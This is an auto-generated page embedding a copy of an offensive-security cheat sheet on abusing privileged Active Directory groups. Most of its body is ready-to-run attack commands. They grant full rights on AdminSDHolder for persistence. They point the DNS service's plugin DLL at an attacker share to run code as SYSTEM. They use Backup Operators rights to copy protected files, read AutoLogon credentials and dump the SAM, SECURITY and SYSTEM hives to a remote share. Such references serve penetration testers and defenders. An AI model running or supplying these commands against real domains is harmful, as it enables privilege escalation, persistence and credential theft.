---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Groups

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adds-groups` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adds-groups.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Groups](../../topics/active-directory/active-directory-groups.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adds-groups |
| name | Active Directory - Groups |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adds-groups.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Groups\n\n## Dangerous Built-in Groups Usage\n\nIf you do not want modified ACLs to be overwritten\
  \ every hour, you should change ACL template on the object `CN=AdminSDHolder,CN=System` or set `adminCount` attribute to\
  \ `0` for the required object.\n\n> The AdminCount attribute is set to `1` automatically when a user is assigned to any\
  \ privileged group, but it is never automatically unset when the user is removed from these group(s).\n\nFind users with\
  \ `AdminCount=1`.\n\n```ps1\nnetexec ldap 10.10.10.10 -u username -p password --admin-count\n# or\nbloodyAD --host 10.10.10.10\
  \ -d example.lab -u john -p pass123 get search --filter '(admincount=1)' --attr sAMAccountName\n# or\npython ldapdomaindump.py\
  \ -u example.com\\john -p pass123 -d ';' 10.10.10.10\njq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]'\
  \ domain_users.json\n# or\nGet-ADUser -LDAPFilter \"(objectcategory=person)(samaccountname=*)(admincount=1)\"\nGet-ADGroup\
  \ -LDAPFilter \"(objectcategory=group) (admincount=1)\"\n# or\n([adsisearcher]\"(AdminCount=1)\").findall()\n```\n\n## AdminSDHolder\
  \ Attribute\n\n> The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to\
  \ all \"protected groups\" in Active Directory and their members. Protected groups include privileged groups such as Domain\
  \ Admins, Administrators, Enterprise Admins, and Schema Admins.\n\nIf you modify the permissions of **AdminSDHolder**, that\
  \ permission template will be pushed out to all protected accounts automatically by `SDProp` (in an hour).\n\nE.g: if someone\
  \ tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.\n\n* Windows/Linux:\n\
  \n  ```ps1\n  bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 add genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab'\
  \ john\n\n  # Clean up after\n  bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 remove genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab'\
  \ john\n  ```\n\n* Windows only:\n\n  ```ps1\n  # Add a user to the AdminSDHolder group:\n  Add-DomainObjectAcl -TargetIdentity\
  \ 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose\n\n  # Right to reset\
  \ password for toto using the account titi\n  Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights\
  \ ResetPassword\n\n  # Give all rights\n  Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName\
  \ toto -Verbose -Rights All\n  ```\n\n## DNS Admins Group\n\n> It is possible for the members of the DNSAdmins group to\
  \ load arbitrary DLL with the privileges of dns.exe (SYSTEM).\n\n:warning: Require privileges to restart the DNS service.\n\
  \n* Enumerate members of DNSAdmins group\n    * Windows/Linux:\n\n    ```ps1\n    bloodyAD --host 10.10.10.10 -d example.lab\
  \ -u john -p pass123 get object DNSAdmins --attr msds-memberTransitive\n    ```\n\n    * Windows only:\n\n    ```ps1\n \
  \   Get-NetGroupMember -GroupName \"DNSAdmins\"\n    Get-ADGroupMember -Identity DNSAdmins\n    ```\n\n* Change dll loaded\
  \ by the DNS service\n\n    ```ps1\n    # with RSAT\n    dnscmd <servername> /config /serverlevelplugindll \\\\attacker_IP\\\
  dll\\mimilib.dll\n    dnscmd 10.10.10.11 /config /serverlevelplugindll \\\\10.10.10.10\\exploit\\privesc.dll\n\n    # with\
  \ DNSServer module\n    $dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All\n    $dnsettings.ServerLevelPluginDll\
  \ = \"\\attacker_IP\\dll\\mimilib.dll\"\n    Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose\n\
  \    ```\n\n* Check the previous command success\n\n    ```ps1\n    Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\\
  Services\\DNS\\Parameters\\ -Name ServerLevelPluginDll\n    ```\n\n* Restart DNS\n\n    ```ps1\n    sc \\\\dc01 stop dns\n\
  \    sc \\\\dc01 start dns\n    ```\n\n## Schema Admins Group\n\n> The Schema Admins group is a security group in Microsoft\
  \ Active Directory that provides its members with the ability to make changes to the schema of an Active Directory forest.\
  \ The schema defines the structure of the Active Directory database, including the attributes and object classes that are\
  \ used to store information about users, groups, computers, and other objects in the directory.\n\n## Backup Operators Group\n\
  \n> Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions\
  \ that protect those files. Backup Operators also can log on to and shut down the computer. This group cannot be renamed,\
  \ deleted, or moved. By default, this built-in group has no members, and it can perform backup and restore operations on\
  \ domain controllers.\n\nThis groups grants the following privileges :\n\n* SeBackup privileges\n* SeRestore privileges\n\
  \nGet members of the group:\n\n* Windows/Linux:\n\n    ```ps1\n    bloodyAD --host 10.10.10.10 -d example.lab -u john -p\
  \ pass123 get object \"Backup Operators\" --attr msds-memberTransitive\n    ```\n\n* Windows only:\n\n    ```ps1\n    PowerView>\
  \ Get-NetGroupMember -Identity \"Backup Operators\" -Recurse\n    ```\n\nEnable privileges using [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)\n\
  \n```ps1\nImport-Module .\\SeBackupPrivilegeUtils.dll\nImport-Module .\\SeBackupPrivilegeCmdLets.dll\n\nSet-SeBackupPrivilege\n\
  Get-SeBackupPrivilege\n```\n\nRetrieve sensitive files\n\n```ps1\nCopy-FileSeBackupPrivilege C:\\Users\\Administrator\\\
  flag.txt C:\\Users\\Public\\flag.txt -Overwrite\n```\n\nRetrieve content of AutoLogon in the `HKLM\\SOFTWARE` hive\n\n```ps1\n\
  $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)\n\
  $winlogon = $reg.OpenSubKey('SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon')\n$winlogon.GetValueNames() | foreach\
  \ {\"$_ : $(($winlogon).GetValue($_))\"}\n```\n\nRetrieve `SAM`,`SECURITY` and `SYSTEM` hives\n\n* [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)\n\
  \n    ```ps1\n    nxc smb 10.10.10.10 -u user -p password -M backup_operator\n    ```\n\n* [mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)\n\
  \n    ```ps1\n    .\\BackupOperatorToDA.exe -t \\\\dc1.lab.local -u user -p pass -d domain -o \\\\10.10.10.10\\SHARE\\\n\
  \    ```\n\n* [improsec/BackupOperatorToolkit](https://github.com/improsec/BackupOperatorToolkit)\n\n    ```ps1\n    .\\\
  BackupOperatorToolkit.exe DUMP \\\\PATH\\To\\Dump \\\\TARGET.DOMAIN.DK\n    ```\n\n## References\n\n* [Poc’ing Beyond Domain\
  \ Admin - Part 1 - cube0x0](https://cube0x0.github.io/Pocing-Beyond-DA/)\n* [WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR\
  \ ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN](https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/)"
_relative_path: active-directory/ad-adds-groups.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adds-groups.md
````
